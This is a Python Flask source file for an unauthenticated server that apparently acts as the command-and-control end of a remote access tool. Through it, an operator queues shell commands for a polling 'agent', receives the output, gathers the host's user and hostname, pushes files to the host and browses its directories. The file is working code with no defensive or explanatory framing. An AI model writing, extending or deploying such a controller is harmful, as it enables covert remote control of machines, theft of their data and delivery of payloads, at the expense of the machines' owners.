from flask import Flask, request, jsonify, render_template, redirect, url_for
import time
from datetime import datetime

app = Flask(__name__)

system_info = {}
info_requested = False
terminal_prompt = "user@agent"
last_seen = 0
ping_requested = False
last_seen_timestamp = None

# JSON structures for the state, file content and file browse
state = {
    "command": None,
    "result": None,
    "acknowledged": False,
}
uploaded_file = {
    "filename": None,
    "content": None,
    "delivered": False
}

file_browse = {
    "path": None,
    "listing": [],
    "requested": False,
    "acknowledged": False
}

@app.route('/')
def index():
    """
    Render the main interface.
    """
    return render_template('terminal.html', prompt_host=terminal_prompt)

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    """
    Endpoint for agent heartbeat pings to indicate online presence.

    Updates:
        last_seen: Timestamp in seconds since epoch of the last heartbeat.
        last_seen_timestamp: Human-readable timestamp string.

    Returns:
        HTTP 204 No Content on success.
    """
    global last_seen, last_seen_timestamp
    last_seen = time.time()
    last_seen_timestamp = datetime.now().strftime("%I:%M:%S %p")
    print("[HEARTBEAT] Agent pinged")
    return '', 204
# status function
@app.route('/status')
def status():
    """
    Provide the online status and last seen timestamp of the agent.
    Online is True if last heartbeat was within 10 seconds.
    Returns:
        JSON containing 'online' (bool) and 'last_seen' (str).
    """
    online = time.time() - last_seen < 10
    return jsonify({
        "online": online,
        "last_seen": last_seen_timestamp or "Never"
    })
# 
@app.route('/request_ping', methods=['POST'])
def request_ping():
    """
    Request the agent to send an immediate heartbeat on its next cycle.

    Sets ping_requested flag for the agent.

    Returns:
        HTTP 204 No Content.
    """
    global ping_requested
    ping_requested = True
    return '', 204

@app.route('/should_ping', methods=['GET'])
def should_ping():
    """
    Endpoint for the agent to check if a ping was requested.

    If ping_requested is True, resets it and returns 'yes', else 'no'.

    Returns:
        Plain text 'yes' or 'no'.
    """
    global ping_requested
    if ping_requested:
        ping_requested = False
        return "yes"
    return "no"

@app.route('/set_command', methods=['POST'])
def set_command():
    """
    Receive and store a command to be executed by the agent.

    Expected JSON payload:
        { 'command': '<shell command>' }

    Updates:
        state['command'], state['result'], state['acknowledged']

    Returns:
        HTTP 204 No Content.
    """
    data = request.get_json()
    state["command"] = data.get("command")
    state["result"] = None
    state["acknowledged"] = False
    print(f"[SET] Command set: {state['command']}")
    return '', 204

@app.route('/get_command', methods=['GET'])
def get_command():
    """
    Agent polls for a new command to execute.

    Returns the command string if one is set and not yet acknowledged,
    otherwise returns 'none'.
    """
    if not state["acknowledged"] and state["command"]:
        print(f"[GET] Agent pulled command: {state['command']}")
        return state["command"]
    return "none"

@app.route('/post_result', methods=['POST'])
def post_result():
    """
    Receive execution result from the agent.

    Expected JSON payload:
        { 'result': '<command output>' }

    Updates:
        state['result'], state['acknowledged'], state['command']

    Returns:
        HTTP 204 No Content.
    """
    data = request.get_json()
    result = data.get('result', '').strip()
    if result:
        state["result"] = result
        state["acknowledged"] = True
        state["command"] = None
        print(f"[POST] Result received:\n{result}")
    return '', 204

@app.route('/get_result', methods=['GET'])
def get_result():
    """
    Agent polls for the result of the last executed command.

    Returns the command output if acknowledged, otherwise 'pending'.
    """
    if state["acknowledged"] and state["result"]:
        return state["result"]
    return "pending"

@app.route('/system')
def system():
    """
    Display collected system information

    Returns:
        HTML template rendering of 'system.html' with system_info dict.
    """
    return render_template('system.html', info=system_info)

@app.route('/request_info', methods=['GET'])
def request_info():
    """
    Trigger the agent to send its system information.

    Sets info_requested flag and redirects to the system page.

    Returns:
        Redirect to '/system'.
    """
    global info_requested
    info_requested = True
    return redirect(url_for('system'))

@app.route('/should_post_info', methods=['GET'])
def should_post_info():
    """
    Pollable endpoint for the agent to know if system info was requested.

    Returns 'yes' if requested, else 'no'.
    """
    return "yes" if info_requested else "no"

@app.route('/post_info', methods=['POST'])
def post_info():
    """
    Receive and store system information from the agent.

    Expected JSON payload containing system details such as user, hostname, etc.

    Updates:
        system_info, info_requested, terminal_prompt

    Returns:
        HTTP 204 No Content.
    """
    global system_info, info_requested, terminal_prompt
    system_info = request.get_json()
    info_requested = False

    user = system_info.get("user", "user")
    hostname = system_info.get("hostname", "agent")
    terminal_prompt = f"{user}@{hostname}"

    print(f"[SYSINFO] Received system info from {terminal_prompt}")
    return '', 204

@app.route('/upload', methods=['GET', 'POST'])
def upload_file():
    """
    Handle file uploads from the web interface.

    GET: Render the upload form.
    POST: Save uploaded file content to memory and log receipt.

    Returns:
        Redirect to '/' on POST, otherwise upload form template.
    """
    global uploaded_file
    if request.method == 'POST':
        f = request.files['file']
        uploaded_file['filename'] = f.filename
        uploaded_file['content'] = f.read()
        uploaded_file['delivered'] = False
        print(f"[UPLOAD] Received file: {f.filename}")
        return redirect(url_for('index'))
    return render_template('upload.html')


@app.route('/get_file', methods=['GET'])
def get_file():
    """
    Provide the next uploaded file to the agent.

    Returns JSON with filename and decoded content if available,
    otherwise filename null.
    """
    if uploaded_file['filename'] and not uploaded_file['delivered']:
        return jsonify({
            "filename": uploaded_file['filename'],
            "content": uploaded_file['content'].decode('latin1')
        })
    return jsonify({"filename": None})

@app.route('/ack_file', methods=['POST'])
def ack_file():
    """
    Acknowledge that the agent has downloaded the file.

    Clears uploaded file state and sets delivered flag.

    Returns:
        HTTP 204 No Content.
    """
    uploaded_file['filename'] = None
    uploaded_file['content'] = None
    uploaded_file['delivered'] = True
    print("[UPLOAD] Agent confirmed file download")
    return '', 204

@app.route('/system_data')
def system_data():
    return jsonify(system_info)

@app.route('/browse')
def browse():
    return render_template('filemanager.html', listing=file_browse["listing"], path=file_browse["path"])

@app.route('/request_browse', methods=['POST'])
def request_browse():
    """
    Request a directory listing from the agent.

    Expected JSON payload:
        { 'path': '<directory path>' }

    Updates file_browse state and clears previous listing.

    Returns:
        HTTP 204 No Content.
    """
    data = request.get_json()
    file_browse["path"] = data.get("path", ".")
    file_browse["requested"] = True
    file_browse["acknowledged"] = False
    file_browse["listing"] = []
    return '', 204

@app.route('/should_browse')
def should_browse():
    """
    Pollable endpoint for agent to check if a browse request exists.

    Returns JSON with 'path' if requested and not acknowledged,
    otherwise path null.
    """
    if file_browse["requested"] and not file_browse["acknowledged"]:
        return jsonify({"path": file_browse["path"]})
    return jsonify({"path": None})

@app.route('/post_listing', methods=['POST'])
def post_listing():
    """
    Receive directory listing from the agent.

    Expected JSON payload:
        { 'listing': [<filenames>] }

    Updates file_browse listing and state flags.

    Returns:
        HTTP 204 No Content.
    """
    data = request.get_json()
    file_browse["listing"] = data.get("listing", [])
    file_browse["acknowledged"] = True
    file_browse["requested"] = False
    print(f"[BROWSE] Listing received for: {file_browse['path']}")
    return '', 204

@app.route('/file_listing')
def file_listing():
    """
    Provide the current directory listing and path as JSON.

    Returns:
        JSON with path and listing.
    """
    return jsonify({
        "path": file_browse["path"],
        "listing": file_browse["listing"]
    })

if __name__ == '__main__':
    print("[*] Flask live terminal server running...")
    app.run(host='0.0.0.0', port=5001)
